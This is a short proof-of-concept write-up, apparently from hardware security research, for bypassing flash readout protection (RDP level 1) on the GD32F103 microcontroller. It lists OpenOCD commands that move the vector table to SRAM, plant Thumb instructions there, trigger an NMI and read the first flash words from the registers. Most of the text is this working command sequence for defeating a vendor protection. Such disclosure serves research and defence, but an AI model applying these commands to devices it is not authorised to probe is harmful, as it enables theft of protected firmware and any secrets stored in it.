D1-C PoC for GD32F103

(This PoC loads just a few words from the beginning of the flash memory. The DMA-based readout is easier, so we did not spend more time on this one. Feel free to extend it!)

Preparation:
	- Load some firmware into the DuT and enable flash security (readout-protection / RDP-level 1)

Attack execution:
	- Power up the board
	- Connect a debugger
	- Startup OpenOCD
	- Connect via "telnet localhost 4444" and execute:

	mww 0xe000ed08 0x20000000; #Set VTOR to 0x20000000
	mww 0x20000008 0x20000021; #Set NMI Vector to 0x20000020 (+1 for ARM Thumb)
	mww 0x20000020 0x20002104; #Instruction: mov r0, #0; mov r1, #4
	mww 0x20000024 0x2208230c; #Instruction: mov r2, #8; mov r3, #12
	mww 0x20000028 0x68006809; #Instruction: ldr r0, [r0]; ldr r1, [r1]
	mww 0x2000002C 0x6812681b; #Instruction: ldr r2, [r2]; ldr r3, [r3]
	mww 0x20000030 0xffffffff; #Crash/stop
	mww 0xe000ed04 0x80000000; #Trigger NMI
	halt; #halt the cpu
	reg; #read out the registers (r0, r1, r2, r3 contains the first 4 words of the flash memory)
